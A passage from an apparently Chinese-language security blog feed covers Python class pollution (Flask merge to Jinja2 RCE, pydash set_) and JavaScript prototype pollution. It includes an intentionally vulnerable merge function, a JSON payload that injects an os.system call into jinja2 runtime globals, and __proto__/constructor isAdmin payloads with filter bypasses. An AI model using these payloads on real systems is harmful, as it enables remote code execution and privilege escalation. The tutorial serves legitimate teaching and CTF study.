way!&quot;&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, flag = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read())</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#flag</span><br><span class="line"></span><br><span class="line">flag&#123;U_Find_Me&#125;</span><br></pre></td></tr></table></figure><p>访问会由于没有设定<code>permission</code>值导致<code>if</code>条件为假返回<code>No way!</code>而不是<code>flag</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240523160412977.png" alt="image-20240523160412977"></p><p>所以它赋值为任意逻辑非空值让条件为真即可</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/9a33b1ea-5c35-4337-adfb-9f0e97587766.png" alt="图片-20230126163147879"></p><h5 id="模板编译时的参数"><a href="#模板编译时的参数" class="headerlink" title="模板编译时的参数"></a>模板编译时的参数</h5><p>在<code>flask</code>实际中，例如使用数据库管理系统中的一个步骤<code>render_template</code>，实际上是对其中一部分<code>Jinja</code>语法进行解析<code>AST</code>，而在语法树的根部<code>Lib/site-packages/jinja2/compiler.py</code>，<code>CodeGenerator``visit_Template</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/d0ca1c4c-ca76-41e3-b982-625dde1a9124.png" alt="图片-20230126200159703"></p><p>该逻辑会输出向流写入拼接的代码（输出流中代码最终会被编译执行），注意其中该<code>exported_names</code>信号，信号为<code>.runtime</code>模块一段（即<code>Lib/site-packages/jinja2/runtime.py</code>）中导入的信号<code>exported</code>和<code>async_exported</code>组合后得到，这就意味着我们可以通过污染<code>.runtime</code>模块中这两个变量实现RCE。由于逻辑模块是模板文件解析过程中必经的步骤之一，所以这就意味着只需渲染任何的文件均能通过这两个变量实现RCE</p><p>模拟环境如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#templates/index.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>nt here~<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># static/</span><br><span class="line"># 是个空目录,方便直接利用static目录读取flag</span><br><span class="line"></span><br><span class="line"># flag flag&#123;U_Find_Me&#125;</span><br></pre></td></tr></table></figure><p>进行<code>RCE</code>将<code>flag</code>写入<code>static</code>目录中</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/b67bed5d-4239-48c1-bd5d-1d365756b07f.png" alt="图片-20230126214719998"></p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__loader__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;sys&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;modules&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;jinja2&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;runtime&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;exported&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;*;__import__(&#x27;os&#x27;).system(&#x27;cp ./flag ./static/flag&#x27;);#&quot;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>需要注意的是，创建<code>payload</code>AST 时，脚本会受到脚本的影响，这意味着脚本<code>payload</code>在第一次执行时会触发，然后点击<code>static</code>目录下<code>flag</code>阅读</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/202/efa03c7e-cc24-4a7f-9a97-cd6e52aaa47f.png" alt="图片-20230126214326335"></p><h3 id="Pydash"><a href="#Pydash" class="headerlink" title="Pydash"></a>Pydash</h3><p><code>Pydash</code>模块中的<code>set_</code>和<code>set_with</code>函数，如上实例中<code>merge</code>函数引用类似的类属性属性逻辑，能够实现污染攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;a&#x27;</span>: &#123;<span class="string">&#x27;b&#x27;</span>: &#123;<span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;&#125;&#125;</span><br><span class="line">set_(data, <span class="string">&#x27;a.b.c&#x27;</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(data)  <span class="comment"># 输出 &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: &#123;&#x27;c&#x27;: 4&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>set_</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;xxxx&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;no&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(son_a.secret) <span class="comment"># xxxx</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret) <span class="comment"># xxxx</span></span><br><span class="line"></span><br><span class="line">set_(instance, <span class="string">&quot;__class__.__base__.secret&quot;</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret) <span class="comment"># no</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret) <span class="comment"># no</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>set_with</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_with</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;xxxx&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;no&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(son_a.secret) <span class="comment"># xxxx</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret) <span class="comment"># xxxx</span></span><br><span class="line"></span><br><span class="line">set_with(instance, <span class="string">&quot;__class__.__base__.secret&quot;</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret) <span class="comment"># no</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret) <span class="comment"># no</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://tttang.com/archive/1876/#toc_jinja_1">https://tttang.com/archive/1876/#toc_jinja_1</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pollution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript Prototype Pollution</title>
      <link href="/2024/02/02/javascript/Javascript%20Prototype%20Pollution/"/>
      <url>/2024/02/02/javascript/Javascript%20Prototype%20Pollution/</url>
      
        <content type="html"><![CDATA[<h2 id="JavaScript-Prototype-Pollution"><a href="#JavaScript-Prototype-Pollution" class="headerlink" title="JavaScript Prototype Pollution"></a>JavaScript Prototype Pollution</h2><p>JavaScript中的原型链污染是指攻击者通过覆盖或修改对象的原型链上的属性，从而改变对象的行为或者访问不应该访问的属性或方法</p><p>原型链污染通常发生在JavaScript对象的继承机制中，因为JavaScript是一种基于原型的语言，对象会继承其原型链上的所有属性和方法</p><p>JS原型链污染分，客户端原型污染、服务端原型污染</p><h3 id="JavaScript-原型"><a href="#JavaScript-原型" class="headerlink" title="JavaScript 原型"></a>JavaScript 原型</h3><p>JavaScript 中的原型是一个对象，它在创建新对象时被用来作为新对象的初始属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="string">&quot;&quot;</span></span><br><span class="line">username.<span class="property">__proto__</span></span><br><span class="line">username[<span class="string">&#x27;__proto__&#x27;</span>]</span><br><span class="line"></span><br><span class="line">username.<span class="property">__proto__</span>                        <span class="comment">// String.prototype</span></span><br><span class="line">username.<span class="property">__proto__</span>.<span class="property">__proto__</span>              <span class="comment">// Object.prototype</span></span><br><span class="line">username.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>    <span class="comment">// null</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/prototype-pollution-prototype-chain.svg" alt="JavaScript 原型链"></p><h3 id="原型链实现继承"><a href="#原型链实现继承" class="headerlink" title="原型链实现继承"></a>原型链实现继承</h3><p>当一个新对象被创建时，它会从构造函数的 <code>prototype</code> 属性指向的对象那里继承属性和方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Parent</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Parent</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">getName</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Child</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="title class_">Child</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Parent</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> child1 = <span class="keyword">new</span> <span class="title class_">Child</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(child1.<span class="title function_">getName</span>()) <span class="comment">// xxxx</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="prototype-proto"><a href="#prototype-proto" class="headerlink" title="prototype  &amp; proto"></a>prototype  &amp; <strong>proto</strong></h3><ol><li>prototype<ul><li><code>prototype</code> 是函数对象特有的属性，每个函数都有一个 <code>prototype</code> 属性，这个prototype属性是一个指向原型对象的指针，它包含了可以由该函数的实例继承的属性和方法</li><li>当你创建一个新的函数时，JavaScript 自动为该函数创建一个 <code>prototype</code> 对象，并赋值给 <code>prototype</code> 属性</li><li>通过 <code>prototype</code> 对象，你可以定义函数的共享属性和方法，它将被该函数的所有实例所共享</li></ul></li><li><strong>proto</strong><ul><li><code>__proto__</code> 是每个对象都具有的属性，用于指向其构造函数的原型。它是一个指向该对象的原型链上一层的链接</li><li><code>__proto__</code> 属性是非标准的，尽管大多数现代浏览器都支持它，但它已经被 ECMAScript 6 标准中的 <code>Object.getPrototypeOf</code> 方法所替代</li><li><code>__proto__</code> 主要用于获取和设置对象的原型</li></ul></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> object = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>) <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(object) === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>) <span class="comment">// true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>总结一下：</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li></ol><h3 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse()"></a>JSON.parse()</h3><p><code>JSON.parse()</code>还将 JSON 对象中的任何键视为任意字符串，包括<code>__proto__</code>这为原型污染提供了一个潜在载体</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> objectLiteral = &#123;<span class="attr">__proto__</span>: &#123;<span class="attr">evilProperty</span>: <span class="string">&#x27;payload&#x27;</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">const</span> objectFromJson = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;evilProperty&quot;: &quot;payload&quot;&#125;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">objectLiteral.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;__proto__&#x27;</span>);     <span class="comment">// false</span></span><br><span class="line">objectFromJson.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;__proto__&#x27;</span>);    <span class="comment">// true</span></span><br><span class="line">s</span><br></pre></td></tr></table></figure><p>Node.js，<code>hasOwnProperty</code>函数用于检查对象自身是否包含指定的属性（即不包括从原型链继承的属性）</p><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="comment">// 如果target与source有相同的键名，则让target的键值为source的键值</span></span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果target与source没有相通的键名，则直接在target新建键名并赋给键值</span></span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 =  <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)<span class="comment">// 1 2</span></span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>) <span class="comment">// 2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>example</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240523091004879.png" alt="image-20240523091004879"></p><h3 id="绕过filter"><a href="#绕过filter" class="headerlink" title="绕过filter"></a>绕过filter</h3><p>每个构造函数(constructor)都有一个原型对象(prototype) <code>constructor.prototype</code> &#x3D;&#x3D;&#x3D;&#x3D; <code>__proto__</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;isAdmin&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;constructor&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;prototype&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;isAdmin&quot;</span>:<span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// payload，修改 Content-Type: application/json</span></span><br></pre></td></tr></table></figure><h4 id="JSON-空格覆盖"><a href="#JSON-空格覆盖" class="headerlink" title="JSON 空格覆盖"></a>JSON 空格覆盖</h4><p>Express 框架提供了一个<code>json spaces</code>选项，使您能够配置用于缩进响应中任何 JSON 数据的空格数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;json spaces&quot;</span>:<span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Javascript </category>
          
      </categories>
